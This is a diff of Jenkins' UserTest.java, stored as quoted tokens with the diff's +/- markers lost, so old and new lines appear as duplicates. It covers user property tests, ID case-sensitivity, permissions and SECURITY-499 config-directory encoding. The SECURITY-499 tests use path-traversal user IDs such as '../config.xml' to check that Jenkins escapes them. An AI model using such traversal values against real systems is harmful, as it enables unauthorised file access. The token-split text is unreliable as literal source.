"start", "\"", ",", "user", ",", "nestedUserSet", "(", "))", ";", "File", "testFile", "=", "new", "File", "(", "j", ".", "getInstance", "(", ").", "getRootDir", "(", ")", "+", "\"", "/", "users", "/", "nesteduserreference", "/", "\"", "+", "TEST_FILE", ")", ";", "SetUserUserProperty", "property", "=", "user", ".", "getProperty", "(", "SetUserUserProperty", ".", "class", ")", ";", "File", "testFile", "=", "property", ".", "getInnerUserClass", "(", ").", "userFile", ";", "List", "<", "String", ">", "fileLines", "=", "FileUtils", ".", "readLines", "(", "testFile", ")", ";", "assertThat", "(", "fileLines", ",", "hasSize", "(", "1", ")", ");", "@", "@", "-", "89", ",", "7", "+", "88", ",", "6", "@", "@", "public", "void", "nestedUserReference", "(", ")", "throws", "Exception", "{", "user", "=", "User", ".", "get", "(", "\"", "nestedUserReference", "\"", ",", "false", ",", "Collections", ".", "emptyMap", "(", "))", ";", "assertThat", "(", "\"", "nested", "reference", "should", "exist", "after", "user", "configuration", "change", "\"", ",", "user", ",", "nestedUserSet", "(", "))", ";", "testFile", "=", "new", "File", "(", "j", ".", "getInstance", "(", ").", "getRootDir", "(", ")", "+", "\"", "/", "users", "/", "nesteduserreference", "/", "\"", "+", "TEST_FILE", ")", ";", "fileLines", "=", "FileUtils", ".", "readLines", "(", "testFile", ")", ";", "assertThat", "(", "fileLines", ",", "hasSize", "(", "1", ")", ");", "}", "@", "@", "-", "167", ",", "9", "+", "165", ",", "10", "@", "@", "public", "UserProperty", "newInstance", "(", "User", "user", ")", "{", "*", "Class", "that", "should", "get", "setUser", "(", "User", ")", "object", "reference", "update", ".", "*", "/", "public", "static", "class", "InnerUserClass", "extends", "AbstractDescribableImpl", "<", "InnerUserClass", ">", "{", "public", "static", "final", "String", "TEST_FILE", "=", "\"", "test", ".", "txt", "\"", ";", "private", "transient", "User", "user", ";", "private", "transient", "File", "userFile", ";", "@", "DataBoundConstructor", "public", "InnerUserClass", "(", ")", "{", "}", "@", "@", "-", "184", ",", "16", "+", "183", ",", "16", "@", "@", "public", "User", "getUser", "(", ")", "{", "public", "void", "setUser", "(", "User", "user", ")", "{", "this", ".", "user", "=", "user", ";", "try", "{", "writeStringToFile", "(", "getUserFile", "(", "),", "String", ".", "valueOf", "(", "currentTimeMillis", "(", "))", ",", "true", ")", ";", "File", "userFile", "=", "getUserFile", "(", ");", "writeStringToFile", "(", "userFile", ",", "String", ".", "valueOf", "(", "currentTimeMillis", "(", "))", ",", "true", ")", ";", "}", "catch", "(", "IOException", "e", ")", "{", "Throwables", ".", "propagate", "(", "e", ")", ";", "}", "}", "private", "File", "getUserFile", "(", ")", "throws", "IOException", "{", "final", "File", "usersRootDir", "=", "new", "File", "(", "Jenkins", ".", "getInstance", "(", ").", "getRootDir", "(", "),", "\"", "users", "\"", ");", "final", "File", "userDir", "=", "new", "File", "(", "usersRootDir", ",", "idStrategy", "(", ").", "filenameOf", "(", "user", ".", "getId", "(", "))", ");", "final", "File", "userFile", "=", "new", "File", "(", "userDir", ",", "TEST_FILE", ")", ";", "userFile", "=", "File", ".", "createTempFile", "(", "\"", "user", "\"", ",", "\"", ".", "txt", "\"", ");", "userFile", ".", "deleteOnExit", "(", ");", "if", "(", "!", "userFile", ".", "exists", "(", "))", "{", "userFile", ".", "createNewFile", "(", ");", "}", "@", "@", "-", "1", ",", "19", "+", "1", ",", "19", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2012", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Erik", "Ramfelt", ",", "*", "Vincent", "Latombe", "*", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "@", "@", "-", "44", ",", "10", "+", "44", ",", "8", "@", "@", "import", "hudson", ".", "tasks", ".", "MailAddressResolver", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "PrintStream", ";", "import", "java", ".", "net", ".", "URL", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Locale", ";", "@", "@", "-", "67", ",", "7", "+", "65", ",", "6", "@", "@", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "*;", "import", "static", "org", ".", "junit", ".", "Assert", ".", "*;", "import", "static", "org", ".", "junit", ".", "Assume", ".", "*;", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "@", "@", "-", "86", ",", "11", "+", "83", ",", "11", "@", "@", "private", "final", "String", "testString", ";", "private", "UserPropertyDescriptor", "descriptorImpl", "=", "new", "UserPropertyDescriptorImpl", "(", ");", "public", "UserPropertyImpl", "(", "String", "testString", ")", "{", "this", ".", "testString", "=", "testString", ";", "}", "public", "String", "getTestString", "(", ")", "{", "return", "testString", ";", "}", "@", "@", "-", "99", ",", "7", "+", "96", ",", "7", "@", "@", "public", "String", "getTestString", "(", ")", "{", "public", "UserPropertyDescriptor", "getDescriptor", "(", ")", "{", "return", "descriptorImpl", ";", "}", "public", "String", "getIconFileName", "(", ")", "{", "return", "\"", "/", "images", "/", "24x24", "/", "gear", ".", "png", "\"", ";", "}", "@", "@", "-", "111", ",", "7", "+", "108", ",", "7", "@", "@", "public", "String", "getDisplayName", "(", ")", "{", "public", "String", "getUrlName", "(", ")", "{", "return", "\"", "userpropertyimpl", "\"", ";", "}", "public", "static", "class", "UserPropertyDescriptorImpl", "extends", "UserPropertyDescriptor", "{", "@", "Override", "public", "UserProperty", "newInstance", "(", "User", "user", ")", "{", "@", "@", "-", "122", ",", "20", "+", "119", ",", "20", "@", "@", "public", "UserProperty", "newInstance", "(", "User", "user", ")", "{", "@", "Issue", "(", "\"", "JENKINS", "-", "2331", "\"", ")", "@", "Test", "public", "void", "userPropertySummaryAndActionAreShownInUserPage", "(", ")", "throws", "Exception", "{", "UserProperty", "property", "=", "new", "UserPropertyImpl", "(", "\"", "NeedleInPage", "\"", ");", "UserProperty", ".", "all", "(", ").", "add", "(", "property", ".", "getDescriptor", "(", "))", ";", "User", "user", "=", "User", ".", "get", "(", "\"", "user", "-", "test", "-", "case", "\"", ");", "user", ".", "addProperty", "(", "property", ")", ";", "HtmlPage", "page", "=", "j", ".", "createWebClient", "(", ").", "goTo", "(", "\"", "user", "/", "user", "-", "test", "-", "case", "\"", ");", "WebAssert", ".", "assertTextPresentInElement", "(", "page", ",", "\"", "NeedleInPage", "\"", ",", "\"", "main", "-", "panel", "\"", ");", "WebAssert", ".", "assertTextPresentInElement", "(", "page", ",", "(", "(", "Action", ")", "property", ")", ".", "getDisplayName", "(", "),", "\"", "side", "-", "panel", "\"", ");", "}", "/", "**", "*", "Asserts", "that", "the", "default", "user", "avatar", "can", "be", "fetched", "(", "ie", "no", "404", ")", "*", "/", "@", "@", "-", "171", ",", "7", "+", "168", ",", "7", "@", "@", "public", "UserProperty", "newInstance", "(", "User", "user", ")", "{", "seccon", ".", "setAuthentication", "(", "orig", ")", ";", "}", "}", "@", "Test", "public", "void", "testGetUser", "(", ")", "throws", "Exception", "{", "{", "@", "@", "-", "196", ",", "22", "+", "193", ",", "16", "@", "@", "public", "void", "caseInsensitivity", "(", ")", "{", "User", "user", "=", "User", ".", "get", "(", "\"", "john", "smith", "\"", ");", "User", "user2", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ");", "assertSame", "(", "\"", "Users", "should", "have", "the", "same", "id", ".", "\",", "user", ".", "getId", "(", "),", "user2", ".", "getId", "(", "))", ";", "assertEquals", "(", "user", ".", "getId", "(", "),", "User", ".", "idStrategy", "(", ").", "idFromFilename", "(", "User", ".", "idStrategy", "(", ").", "filenameOf", "(", "user", ".", "getId", "(", "))", "))", ";", "assertEquals", "(", "user2", ".", "getId", "(", "),", "User", ".", "idStrategy", "(", ").", "idFromFilename", "(", "User", ".", "idStrategy", "(", ").", "filenameOf", "(", "user2", ".", "getId", "(", "))", "))", ";", "}", "@", "Test", "public", "void", "caseSensitivity", "(", ")", "{", "j", ".", "jenkins", ".", "setSecurityRealm", "(", "new", "IdStrategySpecifyingSecurityRealm", "(", "new", "IdStrategy", ".", "CaseSensitive", "(", "))", ");", "User", "user", "=", "User", ".", "get", "(", "\"", "john", "smith", "\"", ");", "User", "user2", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ");", "assertNotSame", "(", "\"", "Users", "should", "not", "have", "the", "same", "id", ".", "\",", "user", ".", "getId", "(", "),", "user2", ".", "getId", "(", "))", ";", "assertEquals", "(", "\"", "john", "smith", "\"", ",", "User", ".", "idStrategy", "(", ").", "keyFor", "(", "user", ".", "getId", "(", "))", ");", "assertEquals", "(", "\"", "john", "smith", "\"", ",", "User", ".", "idStrategy", "(", ").", "filenameOf", "(", "user", ".", "getId", "(", "))", ");", "assertEquals", "(", "\"", "John", "Smith", "\"", ",", "User", ".", "idStrategy", "(", ").", "keyFor", "(", "user2", ".", "getId", "(", "))", ");", "assertEquals", "(", "\"~", "john", "~", "smith", "\"", ",", "User", ".", "idStrategy", "(", ").", "filenameOf", "(", "user2", ".", "getId", "(", "))", ");", "assertEquals", "(", "user", ".", "getId", "(", "),", "User", ".", "idStrategy", "(", ").", "idFromFilename", "(", "User", ".", "idStrategy", "(", ").", "filenameOf", "(", "user", ".", "getId", "(", "))", "))", ";", "assertEquals", "(", "user2", ".", "getId", "(", "),", "User", ".", "idStrategy", "(", ").", "idFromFilename", "(", "User", ".", "idStrategy", "(", ").", "filenameOf", "(", "user2", ".", "getId", "(", "))", "))", ";", "}", "@", "Test", "@", "@", "-", "221", ",", "15", "+", "212", ",", "10", "@", "@", "public", "void", "caseSensitivityEmail", "(", ")", "{", "User", "user2", "=", "User", ".", "get", "(", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", ");", "assertNotSame", "(", "\"", "Users", "should", "not", "have", "the", "same", "id", ".", "\",", "user", ".", "getId", "(", "),", "user2", ".", "getId", "(", "))", ";", "assertEquals", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ",", "User", ".", "idStrategy", "(", ").", "keyFor", "(", "user", ".", "getId", "(", "))", ");", "assertEquals", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ",", "User", ".", "idStrategy", "(", ").", "filenameOf", "(", "user", ".", "getId", "(", "))", ");", "assertEquals", "(", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", ",", "User", ".", "idStrategy", "(", ").", "keyFor", "(", "user2", ".", "getId", "(", "))", ");", "assertEquals", "(", "\"~", "john", ".", "~", "smith", "@", "acme", ".", "org", "\"", ",", "User", ".", "idStrategy", "(", ").", "filenameOf", "(", "user2", ".", "getId", "(", "))", ");", "user2", "=", "User", ".", "get", "(", "\"", "john", ".", "smith", "@", "ACME", ".", "ORG", "\"", ");", "assertEquals", "(", "\"", "Users", "should", "have", "the", "same", "id", ".", "\",", "user", ".", "getId", "(", "),", "user2", ".", "getId", "(", "))", ";", "assertEquals", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ",", "User", ".", "idStrategy", "(", ").", "keyFor", "(", "user2", ".", "getId", "(", "))", ");", "assertEquals", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ",", "User", ".", "idStrategy", "(", ").", "filenameOf", "(", "user2", ".", "getId", "(", "))", ");", "assertEquals", "(", "user", ".", "getId", "(", "),", "User", ".", "idStrategy", "(", ").", "idFromFilename", "(", "User", ".", "idStrategy", "(", ").", "filenameOf", "(", "user", ".", "getId", "(", "))", "))", ";", "assertEquals", "(", "user2", ".", "getId", "(", "),", "User", ".", "idStrategy", "(", ").", "idFromFilename", "(", "User", ".", "idStrategy", "(", ").", "filenameOf", "(", "user2", ".", "getId", "(", "))", "))", ";", "}", "private", "static", "class", "IdStrategySpecifyingSecurityRealm", "extends", "HudsonPrivateSecurityRealm", "{", "@", "@", "-", "244", ",", "21", "+", "230", ",", "10", "@", "@", "public", "IdStrategy", "getUserIdStrategy", "(", ")", "{", "}", "}", "@", "Issue", "(", "\"", "JENKINS", "-", "24317", "\"", ")", "@", "LocalData", "@", "Test", "public", "void", "migration", "(", ")", "throws", "Exception", "{", "assumeFalse", "(", "\"", "was", "not", "a", "problem", "on", "a", "case", "-", "insensitive", "FS", "to", "begin", "with", "\"", ",", "new", "File", "(", "j", ".", "jenkins", ".", "getRootDir", "(", "),", "\"", "users", "/", "bob", "\"", ").", "isDirectory", "(", "))", ";", "User", "bob", "=", "User", ".", "get", "(", "\"", "bob", "\"", ");", "assertEquals", "(", "\"", "Bob", "Smith", "\"", ",", "bob", ".", "getFullName", "(", "))", ";", "assertEquals", "(", "\"", "Bob", "Smith", "\"", ",", "User", ".", "get", "(", "\"", "Bob", "\"", ").", "getFullName", "(", "))", ";", "assertEquals", "(", "\"", "nonexistent", "\"", ",", "User", ".", "get", "(", "\"", "nonexistent", "\"", ").", "getFullName", "(", "))", ";", "assertEquals", "(", "\"[", "bob", "]", "\",", "Arrays", ".", "toString", "(", "new", "File", "(", "j", ".", "jenkins", ".", "getRootDir", "(", "),", "\"", "users", "\"", ").", "list", "(", "))", ");", "}", "@", "Test", "public", "void", "testAddAndGetProperty", "(", ")", "throws", "Exception", "{", "{", "User", "user", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ");", "User", "user", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ");", "UserProperty", "prop", "=", "new", "SomeUserProperty", "(", ");", "user", ".", "addProperty", "(", "prop", ")", ";", "assertNotNull", "(", "\"", "User", "should", "have", "SomeUserProperty", "property", ".", "\",", "user", ".", "getProperty", "(", "SomeUserProperty", ".", "class", ")", ");", "@", "@", "-", "274", ",", "15", "+", "249", ",", "15", "@", "@", "public", "void", "testAddAndGetProperty", "(", ")", "throws", "Exception", "{", "@", "Test", "public", "void", "testImpersonateAndCurrent", "(", ")", "{", "j", ".", "jenkins", ".", "setSecurityRealm", "(", "j", ".", "createDummySecurityRealm", "(", "))", ";", "User", "user", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ");", "User", "user", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ");", "assertNotSame", "(", "\"", "User", "John", "Smith", "should", "not", "be", "the", "current", "user", ".", "\",", "User", ".", "current", "(", ").", "getId", "(", "),", "user", ".", "getId", "(", "))", ";", "SecurityContextHolder", ".", "getContext", "(", ").", "setAuthentication", "(", "user", ".", "impersonate", "(", "))", ";", "SecurityContextHolder", ".", "getContext", "(", ").", "setAuthentication", "(", "user", ".", "impersonate", "(", "))", ";", "assertEquals", "(", "\"", "User", "John", "Smith", "should", "be", "the", "current", "user", ".", "\",", "user", ".", "getId", "(", "),", "User", ".", "current", "(", ").", "getId", "(", "))", ";", "}", "@", "Test", "public", "void", "testGetUnknown", "(", ")", "{", "User", "user", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ");", "User", "user", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ");", "assertNotNull", "(", "\"", "User", "should", "not", "be", "null", ".", "\",", "user", ")", ";", "}", "@", "@", "-", "298", ",", "22", "+", "273", ",", "19", "@", "@", "public", "void", "testGetAndGetAll", "(", ")", "{", "assertNotNull", "(", "\"", "User", "John", "Smith", "should", "be", "created", ".", "\",", "user", ")", ";", "assertTrue", "(", "\"", "Jenkins", "should", "contain", "user", "John", "Smith", ".", "\",", "User", ".", "getAll", "(", ").", "contains", "(", "user", ")", ");", "}", "@", "Test", "public", "void", "testReload", "(", ")", "throws", "Exception", "{", "{", "User", "user", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ",", "true", ",", "Collections", ".", "emptyMap", "(", "))", ";", "String", "originalName", "=", "\"", "John", "Smith", "\"", ";", "User", "user", "=", "User", ".", "get", "(", "originalName", ",", "true", ",", "Collections", ".", "emptyMap", "(", "))", ";", "user", ".", "save", "(", ");", "String", "config", "=", "user", ".", "getConfigFile", "(", ").", "asString", "(", ");", "config", "=", "config", ".", "replace", "(", "\"", "John", "Smith", "\"", ",", "\"", "Alice", "Smith", "\"", ");", "PrintStream", "st", "=", "new", "PrintStream", "(", "user", ".", "getConfigFile", "(", ").", "getFile", "(", "))", ";", "st", ".", "print", "(", "config", ")", ";", "}", "String", "temporaryName", "=", "\"", "Alice", "Smith", "\"", ";", "user", ".", "setFullName", "(", "temporaryName", ")", ";", "j", ".", "jenkins", ".", "reload", "(", ");", "{", "User", "user", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ",", "false", ",", "Collections", ".", "emptyMap", "(", "))", ";", "assertEquals", "(", "\"", "User", "should", "have", "full", "name", "Alice", "Smith", ".", "\",", "\"", "Alice", "Smith", "\"", ",", "user", ".", "getFullName", "(", "))", ";", "}", "user", "=", "User", ".", "get", "(", "originalName", ",", "false", ",", "Collections", ".", "emptyMap", "(", "))", ";", "assertEquals", "(", "\"", "User", "should", "have", "original", "name", ".", "\",", "originalName", ",", "user", ".", "getFullName", "(", "))", ";", "}", "@", "Test", "@", "@", "-", "383", ",", "8", "+", "355", ",", "9", "@", "@", "public", "void", "testDelete", "(", ")", "throws", "Exception", "{", "{", "User", "user", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ",", "true", ",", "Collections", ".", "emptyMap", "(", "))", ";", "user", ".", "save", "(", ");", "File", "configFolder", "=", "user", ".", "getUserFolder", "(", ");", "user", ".", "delete", "(", ");", "assertFalse", "(", "\"", "User", "should", "be", "deleted", "with", "his", "persistent", "data", ".", "\",", "user", ".", "getConfigFile", "(", ").", "exists", "(", "))", ";", "assertFalse", "(", "\"", "User", "should", "be", "deleted", "with", "his", "persistent", "data", ".", "\",", "configFolder", ".", "exists", "(", "))", ";", "assertFalse", "(", "\"", "User", "should", "be", "deleted", "from", "memory", ".", "\",", "User", ".", "getAll", "(", ").", "contains", "(", "user", ")", ");", "user", "=", "User", ".", "get", "(", "\"", "John", "Smith", "\"", ",", "false", ",", "Collections", ".", "emptyMap", "(", "))", ";", "assertNull", "(", "\"", "User", "should", "be", "deleted", "from", "memory", ".", "\",", "user", ")", ";", "@", "@", "-", "404", ",", "7", "+", "377", ",", "7", "@", "@", "public", "void", "testDelete", "(", ")", "throws", "Exception", "{", "@", "Test", "public", "void", "testDoConfigSubmit", "(", ")", "throws", "Exception", "{", "GlobalMatrixAuthorizationStrategy", "auth", "=", "new", "GlobalMatrixAuthorizationStrategy", "(", ");", "GlobalMatrixAuthorizationStrategy", "auth", "=", "new", "GlobalMatrixAuthorizationStrategy", "(", ");", "j", ".", "jenkins", ".", "setAuthorizationStrategy", "(", "auth", ")", ";", "j", ".", "jenkins", ".", "setCrumbIssuer", "(", "null", ")", ";", "HudsonPrivateSecurityRealm", "realm", "=", "new", "HudsonPrivateSecurityRealm", "(", "false", ")", ";", "@", "@", "-", "430", ",", "7", "+", "403", ",", "7", "@", "@", "public", "void", "testDoConfigSubmit", "(", ")", "throws", "Exception", "{", "}", "}", "form", "=", "j", ".", "createWebClient", "(", ").", "withBasicCredentials", "(", "user2", ".", "getId", "(", "),", "\"", "password", "\"", ").", "goTo", "(", "user2", ".", "getUrl", "(", ")", "+", "\"", "/", "configure", "\"", ").", "getFormByName", "(", "\"", "config", "\"", ");", "form", ".", "getInputByName", "(", "\"", "_", ".", "fullName", "\"", ").", "setValueAttribute", "(", "\"", "John", "\"", ");", "j", ".", "submit", "(", "form", ")", ";", "assertEquals", "(", "\"", "User", "should", "be", "albe", "to", "configure", "himself", ".", "\",", "\"", "John", "\"", ",", "user2", ".", "getFullName", "(", "))", ";", "@", "@", "-", "440", ",", "7", "+", "413", ",", "7", "@", "@", "public", "void", "testDoConfigSubmit", "(", ")", "throws", "Exception", "{", "/", "*", "TODO", "cannot", "follow", "what", "this", "is", "purporting", "to", "test", "@", "Test", "public", "void", "testDoDoDelete", "(", ")", "throws", "Exception", "{", "GlobalMatrixAuthorizationStrategy", "auth", "=", "new", "GlobalMatrixAuthorizationStrategy", "(", ");", "GlobalMatrixAuthorizationStrategy", "auth", "=", "new", "GlobalMatrixAuthorizationStrategy", "(", ");", "j", ".", "jenkins", ".", "setAuthorizationStrategy", "(", "auth", ")", ";", "j", ".", "jenkins", ".", "setCrumbIssuer", "(", "null", ")", ";", "HudsonPrivateSecurityRealm", "realm", "=", "new", "HudsonPrivateSecurityRealm", "(", "false", ")", ";", "@", "@", "-", "486", ",", "7", "+", "459", ",", "7", "@", "@", "public", "void", "testDoDoDelete", "(", ")", "throws", "Exception", "{", "@", "Test", "public", "void", "testHasPermission", "(", ")", "throws", "IOException", "{", "GlobalMatrixAuthorizationStrategy", "auth", "=", "new", "GlobalMatrixAuthorizationStrategy", "(", ");", "GlobalMatrixAuthorizationStrategy", "auth", "=", "new", "GlobalMatrixAuthorizationStrategy", "(", ");", "j", ".", "jenkins", ".", "setAuthorizationStrategy", "(", "auth", ")", ";", "j", ".", "jenkins", ".", "setCrumbIssuer", "(", "null", ")", ";", "HudsonPrivateSecurityRealm", "realm", "=", "new", "HudsonPrivateSecurityRealm", "(", "false", ")", ";", "@", "@", "-", "505", ",", "7", "+", "478", ",", "7", "@", "@", "public", "void", "testHasPermission", "(", ")", "throws", "IOException", "{", "@", "Test", "public", "void", "testCanDelete", "(", ")", "throws", "IOException", "{", "GlobalMatrixAuthorizationStrategy", "auth", "=", "new", "GlobalMatrixAuthorizationStrategy", "(", ");", "GlobalMatrixAuthorizationStrategy", "auth", "=", "new", "GlobalMatrixAuthorizationStrategy", "(", ");", "j", ".", "jenkins", ".", "setAuthorizationStrategy", "(", "auth", ")", ";", "j", ".", "jenkins", ".", "setCrumbIssuer", "(", "null", ")", ";", "HudsonPrivateSecurityRealm", "realm", "=", "new", "HudsonPrivateSecurityRealm", "(", "false", ")", ";", "@", "@", "-", "628", ",", "6", "+", "601", ",", "7", "@", "@", "public", "void", "resolveByUnloadedIdThenName", "(", ")", "throws", "Exception", "{", "assertEquals", "(", "\"", "victim2", "is", "a", "real", "(", "canonical", ")", "user", "ID", "\"", ",", "\"", "victim2", "\"", ",", "User", ".", "get", "(", "\"", "Victim2", "\"", ").", "getId", "(", "))", ";", "}", "private", "static", "class", "ExternalSecurityRealm", "extends", "AbstractPasswordBasedSecurityRealm", "{", "@", "Override", "public", "UserDetails", "loadUserByUsername", "(", "String", "username", ")", "throws", "UsernameNotFoundException", "{", "@", "@", "-", "729", ",", "115", "+", "703", ",", "38", "@", "@", "public", "void", "getAllPropertiesRequiresAdmin", "(", ")", "{", "}", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "499", "\"", ")", "public", "void", "createdUsersHaveCorrectConfigLocation", "(", ")", "{", "assertCorrectConfig", "(", "User", ".", "getById", "(", "\"", "admin", "\"", ",", "true", ")", ",", "\"", "users", "/", "admin", "/", "config", ".", "xml", "\"", ");", "assertCorrectConfig", "(", "User", ".", "getById", "(", "\"", "foo", "\"", ",", "true", ")", ",", "\"", "users", "/", "foo", "/", "config", ".", "xml", "\"", ");", "assertCorrectConfig", "(", "User", ".", "getById", "(", "\"", "foo", "/", "bar", "\"", ",", "true", ")", ",", "\"", "users", "/", "foo", "$", "002fbar", "/", "config", ".", "xml", "\"", ");", "assertCorrectConfig", "(", "User", ".", "getById", "(", "\"", "foo", "/", "bar", "/", "baz", "\"", ",", "true", ")", ",", "\"", "users", "/", "foo", "$", "002fbar", "$", "002fbaz", "/", "config", ".", "xml", "\"", ");", "assertCorrectConfig", "(", "User", ".", "getById", "(", "\"/", "\",", "true", ")", ",", "\"", "users", "/", "$", "002f", "/", "config", ".", "xml", "\"", ");", "assertCorrectConfig", "(", "User", ".", "getById", "(", "\".", "\",", "true", ")", ",", "\"", "users", "/", "$", "002f", "/", "config", ".", "xml", "\"", ");", "assertCorrectConfig", "(", "User", ".", "getById", "(", "\".", ".\"", ",", "true", ")", ",", "\"", "users", "/", "$", "002e", "$", "002e", "/", "config", ".", "xml", "\"", ");", "assertCorrectConfig", "(", "User", ".", "getById", "(", "\".", "./", "config", ".", "xml", "\"", ",", "true", ")", ",", "\"", "users", "/", "..", "$", "002fconfig", ".", "xml", "/", "config", ".", "xml", "\"", ");", "@", "LocalData", "public", "void", "differentUserIdInConfigFileIsIgnored", "(", ")", "{", "String", "fredUserId", "=", "\"", "fred", "\"", ";", "User", "fred", "=", "User", ".", "getById", "(", "fredUserId", ",", "false", ")", ";", "assertThat", "(", "fred", ",", "notNullValue", "(", "))", ";", "assertThat", "(", "fred", ".", "getId", "(", "),", "is", "(", "fredUserId", ")", ");", "assertThat", "(", "fred", ".", "getFullName", "(", "),", "is", "(", "\"", "Fred", "Smith", "\"", "))", ";", "User", "jane", "=", "User", ".", "getById", "(", "\"", "jane", "\"", ",", "false", ")", ";", "assertThat", "(", "jane", ",", "nullValue", "(", "))", ";", "}", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "499", "\"", ")", "@", "LocalData", "public", "void", "legacyUserConfigDirsMigrated", "(", ")", "{", "File", "rootDir", "=", "new", "File", "(", "Jenkins", ".", "getInstance", "(", ").", "getRootDir", "(", "),", "\"", "users", "\"", ");", "User", "admin", "=", "User", ".", "getById", "(", "\"", "admin", "\"", ",", "false", ")", ";", "assertCorrectConfig", "(", "admin", ",", "\"", "users", "/", "admin", "/", "config", ".", "xml", "\"", ");", "assertTrue", "(", "admin", ".", "getConfigFile", "(", ").", "getFile", "(", ").", "exists", "(", "))", ";", "assertThat", "(", "admin", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "Admin", "\"", "))", ";", "User", "foo", "=", "User", ".", "getById", "(", "\"", "foo", "\"", ",", "false", ")", ";", "File", "fooDir", "=", "new", "File", "(", "rootDir", ",", "\"", "foo", "\"", ");", "assertCorrectConfig", "(", "foo", ",", "\"", "users", "/", "foo", "/", "config", ".", "xml", "\"", ");", "assertTrue", "(", "foo", ".", "getConfigFile", "(", ").", "getFile", "(", ").", "exists", "(", "))", ";", "assertTrue", "(", "fooDir", ".", "exists", "(", "))", ";", "assertThat", "(", "foo", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "Foo", "\"", "))", ";", "User", "fooBar", "=", "User", ".", "getById", "(", "\"", "foo", "/", "bar", "\"", ",", "false", ")", ";", "File", "fooBarDir", "=", "new", "File", "(", "fooDir", ",", "\"", "bar", "\"", ");", "assertCorrectConfig", "(", "fooBar", ",", "\"", "users", "/", "foo", "$", "002fbar", "/", "config", ".", "xml", "\"", ");", "assertTrue", "(", "fooBar", ".", "getConfigFile", "(", ").", "getFile", "(", ").", "exists", "(", "))", ";", "assertTrue", "(", "fooDir", ".", "exists", "(", "))", ";", "assertTrue", "(", "fooBarDir", ".", "exists", "(", "))", ";", "assertThat", "(", "fooBar", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "Foo", "Bar", "\"", "))", ";", "User", "fooBaz", "=", "User", ".", "getById", "(", "\"", "foo", "/", "baz", "\"", ",", "false", ")", ";", "File", "fooBazDir", "=", "new", "File", "(", "fooDir", ",", "\"", "baz", "\"", ");", "assertCorrectConfig", "(", "fooBaz", ",", "\"", "users", "/", "foo", "$", "002fbaz", "/", "config", ".", "xml", "\"", ");", "assertTrue", "(", "fooBaz", ".", "getConfigFile", "(", ").", "getFile", "(", ").", "exists", "(", "))", ";", "assertTrue", "(", "fooDir", ".", "exists", "(", "))", ";", "assertFalse", "(", "fooBazDir", ".", "exists", "(", "))", ";", "assertThat", "(", "fooBaz", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "Foo", "Baz", "\"", "))", ";", "User", "fooBarBaz", "=", "User", ".", "getById", "(", "\"", "foo", "/", "bar", "/", "baz", "\"", ",", "false", ")", ";", "File", "fooBarBazDir", "=", "new", "File", "(", "fooBarDir", ",", "\"", "baz", "\"", ");", "assertCorrectConfig", "(", "fooBarBaz", ",", "\"", "users", "/", "foo", "$", "002fbar", "$", "002fbaz", "/", "config", ".", "xml", "\"", ");", "assertTrue", "(", "fooBarBaz", ".", "getConfigFile", "(", ").", "getFile", "(", ").", "exists", "(", "))", ";", "assertTrue", "(", "fooDir", ".", "exists", "(", "))", ";", "assertFalse", "(", "fooBarBazDir", ".", "exists", "(", "))", ";", "assertFalse", "(", "fooBarDir", ".", "exists", "(", "))", ";", "assertThat", "(", "fooBarBaz", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "Foo", "Bar", "Baz", "\"", "))", 